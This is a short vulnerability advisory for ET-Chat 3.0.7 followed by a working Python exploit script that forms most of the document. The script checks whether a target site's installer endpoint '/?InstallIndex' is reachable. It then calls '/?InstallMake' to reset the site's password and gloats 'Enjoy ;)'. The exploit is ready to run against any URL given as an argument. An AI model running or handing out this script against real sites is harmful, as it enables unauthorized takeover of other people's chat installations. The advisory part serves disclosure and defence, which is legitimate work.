source: http://www.securityfocus.com/bid/66149/info

ET - Chat is prone to a security bypass vulnerability.

An attacker can exploit this issue to bypass certain security restrictions and perform unauthorized actions; this may aid in launching further attacks.

ET - Chat 3.0.7 is vulnerable; other versions may also be affected.

#!/usr/bin/env python
__author__ = 'IRH'
print "Example: et-chat.py http://et-chat.com/chat"

import urllib
import sys

url = sys.argv[1]
url1 = url+"/?InstallIndex"
url2 = url+"/?InstallMake"

checkurl = urllib.urlopen(url1)

if checkurl.code == 200 :
    urllib.urlopen(url2)
    print "Password Was Reseted!! Enjoy ;)"
else:
    print "Site is not Vulnerability"